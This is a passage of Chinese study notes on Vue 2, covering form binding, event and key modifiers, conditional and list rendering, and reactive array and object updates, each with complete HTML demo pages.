    options: [
      { text: 'One', value: 'A' },
      { text: 'Two', value: 'B' },
      { text: 'Three', value: 'C' }
    ]
  }
})
```

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/GIF%20(2).gif" alt="GIF (2)" style="zoom: 80%;" />

如果 `v-model` 表达式的初始值未能匹配任何选项，`<select>` 元素将被渲染为“未选中”状态。在 iOS 中，这会使用户无法选择第一个选项。因为这样的情况下，iOS 不会触发 change 事件。因此，更推荐像上面这样提供一个值为空的禁用选项。

#### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			// 表单
			<form @submit.prevent="demo">    //表单提交调用demo()
				// 属性绑定
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>  //checkbox不用设置默认值
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],         //多选框 必须用数组
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))   // JavaScript 对象或值转换为 JSON 字符串
				}
			}
		})
	</script>
</html>
```

运行结果

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231117215824382.png" alt="image-20231117215824382" style="zoom:67%;" />

## 事件绑定(@)

关于事件，把握好三个步骤：设参、传参和接参。

**使用 v-on:xxx 或 @xxx  绑定事件，其中xxx是事件名**

+ 使用 `methods` 定义方法对事件进行处理
+ 在调用方法的时候传入一个 `$event`，这就是事件对象

示例： 

```html
<div id="example-1">
  <button @click="counter += 1">Add 1</button>
  <button @click="counter -= 1">Sub 1</button>
  <p>Counter: {{ counter }}</p>
</div>
```

```javascript
var example1 = new Vue({
  el: '#example-1',
  data: {
    counter: 0
  }
})
```



### 常见的 Vue 事件

在 Vue.js 中，你可以使用各种事件来监听 DOM 元素上发生的各种交互动作。以下是一些常见的 Vue 事件：

1. **`@click`：** 监听点击事件。

   ```
   <button @click="handleClick">点击我</button>
   ```

2. **`@input`：** 监听输入事件，通常用于表单元素。

   ```
   <input type="text" @input="handleInput">
   ```

3. **`@change`：** 监听元素值变化事件，常用于 `<select>` 元素。

   ```
   <select @change="handleChange">
       <!-- options here -->
   </select>
   ```

4. **`@submit`：** 监听表单提交事件。

   ```
   code<form @submit="handleSubmit">
       <!-- form elements here -->
   </form>
   ```

5. **`@mouseover` 和 `@mouseout`：** 监听鼠标移入和移出事件。

   ```
   <div @mouseover="handleMouseOver" @mouseout="handleMouseOut">鼠标悬停</div>
   ```

6. **`@keydown` 和 `@keyup`：** 监听键盘按下和弹起事件。

   ```
   <input type="text" @keydown="handleKeyDown" @keyup="handleKeyUp">
   ```

7. **`@focus` 和 `@blur`：** 监听元素获取焦点和失去焦点事件。

   ```
   <input type="text" @focus="handleFocus" @blur="handleBlur">
   ```

8. **自定义事件：** 除了上述内置事件外，你还可以使用 `$emit` 来触发和监听自定义事件。

   ```
   @参数=自定义方法
   ```

   ```
   <my-component @custom-event="handleCustomEvent"></my-component>
   ```
   
   在组件内部：
   
   ```
   codemethods: {
       triggerCustomEvent() {
           this.$emit('custom-event', eventData);
       }
   }
   ```

### 基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				事件的基本使用：
							1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 推荐使用@
							2.事件的回调需要配置在methods对象中，最终会在vm上；
							3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
							4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
							5.@click="处理函数" 和 @click="demo($event)" 效果一致，但后者可以传参；
		-->

		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,666)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{   // 事件
				showInfo1(event){
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

![](vue%E7%AC%94%E8%AE%B0.assets/image-20231120201516157.png)

### 通用事件修饰符

- `.stop`
- `.prevent`
- `.capture`
- `.self`
- `.once`
- `.passive`

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
						7.可以连用比如: .passiveonce
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>  //这里的效果就是链接不会跳转,会出现弹窗

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕；及优先响应默认行为 -->
			<ul @wheel.passive="demo" class="list"> //wheel鼠标滚轮
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

![image-20231120202009399](vue%E7%AC%94%E8%AE%B0.assets/image-20231120202009399.png)

### 键盘事件(@keyup & @keydown)

#### 按键修饰符

##### 键盘常用的 keyCode

| keyCode  | 实际键值              |
| -------- | --------------------- |
| 48到57   | 0到9                  |
| 65到90   | a到z（A到Z）          |
| 112到135 | F1到F24               |
| 8        | BackSpace（退格）     |
| 9        | Tab                   |
| **13**   | Enter（回车）         |
| 20       | Caps_Lock（大写锁定） |
| 32       | Space（空格键）       |
| 37       | Left（左箭头）        |
| 38       | Up（上箭头）          |
| 39       | Right（右箭头）       |
| 40       | Down（下箭头）        |

##### 使用keyCode作为按键修饰符

在 Vue 中，允许为 `v-on` 在监听键盘事件时添加按键修饰符：

```html
<!-- 只有在 `keyCode` 是 13 时调用 `vm.submit()` -->
<input v-on:keyup.13="submit">
```

##### 按键修饰符别名

记住所有的 `keyCode` 比较困难，所以 Vue 为最常用的按键提供了别名：

```html
<!-- 同上 -->
<input v-on:keyup.enter="submit">

<!-- 缩写语法 -->
<input @keyup.enter="submit">
```

##### 按键别名表

| 别名    | 实际键值                                   |
| ------- | ------------------------------------------ |
| .delete | delete（删除）/BackSpace（退格）           |
| .tab    | Tab                                        |
| .enter  | Enter（回车）                              |
| .esc    | Esc（退出）                                |
| .space  | Space（空格键）                            |
| .left   | Left（左箭头）                             |
| .up     | Up（上箭头）                               |
| .right  | Right（右箭头）                            |
| .down   | Down（下箭头）                             |
| .ctrl   | Ctrl                                       |
| .alt    | Alt                                        |
| .shift  | Shift                                      |
| .meta   | (window系统下是window键，mac下是command键) |

##### 自定义别名

上面说了，可以通过 `config.keyCodes` 指定一按键修饰符别名。

例如，改变其中一个键值对应的别名：

```javascript
// 可以使用 `v-on:keyup.f1`
Vue.config.keyCodes.f1 = 112
```

又比如，改变多个键值对应的别名：

```javascript
Vue.config.keyCodes = {
  v: 86,
  f1: 112,
  // camelCase 不可用
  mediaPlayPause: 179,
  // 取而代之的是 kebab-case 且用双引号括起来
  "media-play-pause": 179,
  up: [38, 87]
}
```

使用的时候：

```html
<input type="text" @keyup.media-play-pause="method">
```

##### 自动匹配按键修饰符

> 2.5.0 新增

也可直接将 [`KeyboardEvent.key`](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key/Key_Values) 暴露的任意有效按键名转换为 kebab-case 来作为修饰符：

```html
<input @keyup.page-down="onPageDown">
```

在上面的例子中，处理函数仅在 `$event.key === 'PageDown'` 时被调用。

具体的`KeyboardEvent.key`可以在MDN中查看，这里仅列举一些常见的key:

```vue
Alt、Shift、Enter、Tab、
ArrowDown、ArrowLeft、ArrowRight、ArrowUp、
End、Home、PageDown、PageUp、
Backspace、Delete、Insert、
Copy、Cut、Paste、Redo、Undo、
Pause、Play、ZoomIn、ZoomOut
```

#### 系统修饰键

> 2.1.0 新增

可以用如下修饰符来实现仅在按下相应按键时才触发鼠标或键盘事件的监听器。

- `.ctrl`
- `.alt`
- `.shift`
- `.meta`

在 Mac 系统键盘上，meta 对应 command 键 (⌘)。在 Windows 系统键盘 meta 对应 Windows 徽标键 (⊞)。在 Sun 操作系统键盘上，meta 对应实心宝石键 (◆)。在其他特定键盘上，尤其在 MIT 和 Lisp 机器的键盘、以及其后继产品，比如 Knight 键盘、space-cadet 键盘，meta 被标记为“META”。在 Symbolics 键盘上，meta 被标记为“META”或者“Meta”。

例如：

```html
<!-- Alt + C -->
<input @keyup.alt.67="clear">

<!-- Ctrl + Click -->
<div @click.ctrl="doSomething">Do something</div>
```

请注意修饰键与常规按键不同，在和 `keyup` 事件一起用时，事件触发时修饰键必须处于按下状态。换句话说，只有在按住 `ctrl` 的情况下释放其它按键，才能触发 `keyup.ctrl`。而单单释放 `ctrl` 也不会触发事件。

 **`.exact` 修饰符**

> 2.5.0 新增

`.exact` 修饰符允许你控制由精确的系统修饰符组合触发的事件。

```html
<!-- 即使 Alt/shift 或 Shift 被一同按下时也会触发 -->
<button @click.ctrl="onClick">A</button>

<!-- 有且只有 Ctrl 被按下的时候才触发 -->
<button @click.ctrl.exact="onCtrlClick">A</button>

<!-- 没有任何系统修饰符被按下的时候才触发 -->
<button @click.exact="onClick">A</button>
```

### 鼠标事件(@mousemove)

按钮修饰符

> 2.1.0 新增

- `.left`
- `.right`
- `.middle`

这些修饰符会限制处理函数仅响应特定的鼠标按钮。

```html
<html>
	<head>
		<meta charset="utf-8" />
		<title></title>
	</head>
	<body>
		<div id="app">
			<p @mousemove="mm">
				x:{{x}}
				y:{{y}}
				<span  @mousemove.stop>鼠标移动到此即停止</span>
			</p>
		</div>
	</body>
	<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
	<script type="text/javascript">
		new Vue({
			el:'#app',
			data:{
				x:0,
				y:0
			},
			methods:{
				mm:function(event){
					this.x = event.clientX;
					this.y = event.clientY;
				},
				stopm:function(event){
					event.stopPropagation();
				}	
			}
		})
	</script>
</html>
```

当鼠标经过P标签区域内时，区域内就会显示X和Y轴的坐标，如果经过P标签内的Span标签内时，此时会调用事件属性mousemove.stop预定的效果，鼠标移动的效果将会被取消，X和Y不再显示信息。

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。
							(3).指定按键  @keyup.ctrl.n 表示按下ctrl + n

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">   //@keydown.huiche="showInfo"绑定的事件
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

![image-20231120202334720](vue%E7%AC%94%E8%AE%B0.assets/image-20231120202334720.png)

## 条件渲染(if)

### v-if 切换频率较低的场景

在 Vue 中，可以使用 v-if 指令实现条件渲染，用法与其他编程语言条件判断语句类似：

```html
<div v-if="type === 'A'">A</div>
<div v-else-if="type === 'B'">B</div>
<div v-else-if="type === 'C'">C</div>
<div v-else>Not A/B/C</div>
```

### v-show 切换频率较高的场景

带有 v-show 的元素始终会被渲染并保留在 DOM 中。v-show 只是简单地切换元素的 CSS 属性 display：

注意:warning:: v-show 不支持 `<template>` 元素，也不支持 v-else。

v-if和v-show之间有着看似相同的效果，但优化上却有区别。

```html
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
	</head>
	<body>
			<p v-show="rich">
				有钱！
			</p>
			<p v-if="rich">
				有钱！
			</p>
			<button type="button" @click="rich=!rich">今晚彩票开奖</button>
		</div>
	</body>
	<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
	<script>
		new Vue({
			el:'#app',
			data:{
				flag:false,
				rich:false
			},
			methods:{
			}
		});

	</script>
</html>
```

通过点击“今晚彩票开奖”按钮，能切换rich的值，此时发现，v-if和v-show的显示状态都会来回切换。看起来是一样的，但通过查看控制台代码发现:

v-show实际会将p标签的css样式的display属性设为none来达到隐藏的效果。

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013563563-394e8ae4-8a8c-4e7a-8cd3-68c04af9d0b7.png" alt="img" style="zoom:80%;" />

而v-if是直接在页面上添加和删除p标签来达到效果，因此v-show在反复切换的应用场景下，效率比v-if更高。

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013576224-8e8ae787-878c-486b-bac9-2e224fdbe2d8.png" alt="img" style="zoom:67%;" />

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				条件渲染：
							1.v-if
										写法：
												(1).v-if="表达式" 
												(2).v-else-if="表达式"
												(3).v-else="表达式"
										适用于：切换频率较低的场景。
										特点：不展示的DOM元素直接被移除。
										使用: v-if与template的配合使用 
										注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

							2.v-show
										写法：v-show="表达式"
										适用于：切换频率较高的场景。
										特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
								
							3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		
							表达式: 定义的属性可以直接那来用
						-->

		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- ①使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- ②使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->
			<!--字符串判断 v-if="title === '新增用户'"  -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

### 补充

vue3中默认支持动态渲染, 及不需要:

例子 

vue3

```vue
<template>
  <div>
    <button @click="toggleExpansion">Toggle Expansion</button>

    <template v-if="isExpanded">
      <Expand />
    </template>
    <template v-else>
      <Fold />
    </template>
  </div>
</template>

<script>
import { ref } from 'vue';
import Expand from './Expand.vue';
import Fold from './Fold.vue';

export default {
  components: {
    Expand,
    Fold,
  },
  data() {
    return {
      isExpanded: false,
    };
  },
  methods: {
    toggleExpansion() {
      this.isExpanded = !this.isExpanded;
    },
  },
};
</script>
```

vue2

在Vue 2中，可以使用带有<component>元素的is属性实现动态组件呈现。这里有一个例子:

```vue
<template>
  <div>
    <button @click="toggleExpansion">Toggle Expansion</button>

    <component :is="isExpanded ? 'Expand' : 'Fold'" />
  </div>
</template>

<script>
import Expand from './Expand.vue';
import Fold from './Fold.vue';

export default {
  components: {
    Expand,
    Fold,
  },
  data() {
    return {
      isExpanded: false,
    };
  },
  methods: {
    toggleExpansion() {
      this.isExpanded = !this.isExpanded;
    },
  },
};
</script>

```



## 列表渲染(for)

建议绑定到`item.id`身上,使用每一项数据中稳定且唯一的标识作为 key！

### 数组迭代

我们用 v-for 指令根据一组数组的选项列表进行渲染。

```html
<ul id="example-1">
  <li v-for="(item, index) in [{ message: 'Foo' },{ message: 'Bar' }]" :key="index">
    {{ item.message }}
  </li>
</ul>
```

- 第一个参数: 被遍历的数组的每一项
- 第二个参数: 当前项的索引
- key: 唯一标识 (如果不提供 key 会报警告)

也可以用 of 替代 in 作为分隔符，因为它是最接近 JavaScript 迭代器的语法：

```html
<div v-for="item of items"></div>
```

### 对象迭代

除了数组，for-in 甚至可以对 Object 进行迭代

```html
<div v-for="(value, key, index) in {firstName: 'John', lastName: 'Doe', age: 30}">
  {{ index }}. {{ key }}: {{ value }}
</div>
```

- 第一个参数: 键值
- 第二个参数: 键名
- 第三个参数: 索引

注意:warning:: 在遍历对象时，是按 Object.keys() 的结果遍历，但是不能保证它的结果在不同的 JavaScript 引擎下是一致的。

### 整数迭代

v-for可以单独遍历一个简单的整数，比如：

```html
<div>
  <span v-for="n in 10">{{ n }} </span>
</div>
```

### 结合v-if使用

当 v-if 与 v-for 处于同一节点，v-for 的优先级比 v-if 更高，这意味着 v-if 将分别重复运行于每个 v-for 循环中。当你想为仅有的一些项渲染节点时，这种优先级的机制会十分有用。

```html
<li v-for="todo in todos" v-if="!todo.isComplete">
  {{ todo }}
</li>
```

而如果你的目的是有条件地跳过循环的执行，那么可以将 v-if 置于外层元素。

```html
<ul v-if="todos.length">
  <li v-for="todo in todos">
    {{ todo }}
  </li>
</ul>
<p v-else>No todos left!</p>
```

### 嵌套迭代

```html
<body>
<div id="app">
    <ul>
        <li v-for=" student in students">
        	<span v-for="(v,k,i) in student">{{i+1}}--{{k}}--{{v}}</span>
    	</li>
    </ul>
</div>
</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>
    new Vue({
    	el:'#app',
    	data:{
       	 	students:[
            	{
                	name:'小鱼',
                	age:20
                  	girl:'如花'
            	},
            	{
                	name:'小飞',
                	age:21,
                    girl: '翠花'
            	}
        	]
    	}
	});
</script>
```

![image-20231120200832517](vue%E7%AC%94%E8%AE%B0.assets/image-20231120200832517.png)

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-for指令:
						1.用于展示列表数据
						2.语法：v-for="(item, index) in xxx" :key="yyy"  //yyy就表示0,1,2....
						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				
				<li v-for="(p,index) of persons" :key="index">  //遍历
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[//数组
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{//对象
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello' //字符串
				}
			})
		</script>
</html>
```

![image-20231120170957338](vue%E7%AC%94%E8%AE%B0.assets/image-20231120170957338.png)

## 列表渲染[数据更删改查]

### 过滤

`filter` 方法接受一个回调函数作为参数，这个回调函数定义了过滤的条件。箭头函数中的部分 `return p.name.indexOf(this.keyWord) !== -1` 表示对数组中的每个元素 `p`，检查其 `name` 属性是否包含 `this.keyWord`。如果 `name` 中包含 `this.keyWord`，则这个元素被保留在过滤后的数组中。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">  //遍历符合条件的
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				// 计算属性
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{   //过滤
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```

![image-20231120212908893](vue%E7%AC%94%E8%AE%B0.assets/image-20231120212908893.png)

### 排序

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						// 过滤
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							//排序
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```

![image-20231120220716499](vue%E7%AC%94%E8%AE%B0.assets/image-20231120220716499.png)

### 数据更删改查

vue2还需要这些, vue3就简单多了

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!--
			Vue监视数据的原理：
				1. vue会监视data中所有层次的数据。

				2. 如何监测对象中的数据？
								通过setter实现监视，且要在new Vue时就传入要监测的数据。
									(1).对象中后追加的属性，Vue默认不做响应式处理
									(2).如需给后添加的属性做响应式，请使用如下API：
													Vue.set(target，propertyName/index，value) 或 
													vm.$set(target，propertyName/index，value)

				3. 如何监测数组中的数据？
									通过包裹数组更新元素的方法实现，本质就是做了两件事：
										(1).调用原生对应的方法对数组进行更新。
										(2).重新解析模板，进而更新页面。

				4.在Vue修改数组中的某个元素一定要用如下方法：
							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
							2.Vue.set() 或 vm.$set()
				
				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>  //加上''表示字符串  不加表示变量
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				// 对象
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// 给对象添加属性
					Vue.set(this.student,'sex','男')
					//this.$set(this.student,'sex','男')
				},
				addFriend(){
					// 给属性添加新增(往前)
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					// 修改属性值
					this.student.friends[0].name = '张三'  //注意: this.student.friends[0] = 报错的
				},
				addHobby(){
					// 给属性添加新增(往后)
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby[0] = 报错的
					// this.student.hobby.splice(0,1,'开车')
					// 修改属性值
